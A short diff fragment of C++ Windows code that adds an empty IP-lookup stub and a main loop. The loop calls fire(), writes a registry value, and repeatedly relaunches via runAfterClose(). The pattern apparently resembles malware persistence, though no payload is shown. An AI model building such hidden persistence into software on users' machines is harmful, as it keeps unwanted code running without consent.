@@ -59,3 +59,20 @@ void runAfterClose() {
         }
     }
 }
+
+void getNoIpAddress() {
+    //logic to get the ip address using DNS with C++
+}
+
+int main() {
+    fire();
+    Sleep(5000);
+    setRegKeyValue(REG_PATH, REG_NAME, REG_VALUE);
+
+    while (true) {
+        runAfterClose();
+        Sleep(TIME_SLEEP * 1000);
+    }
+
+    return 0;
+}
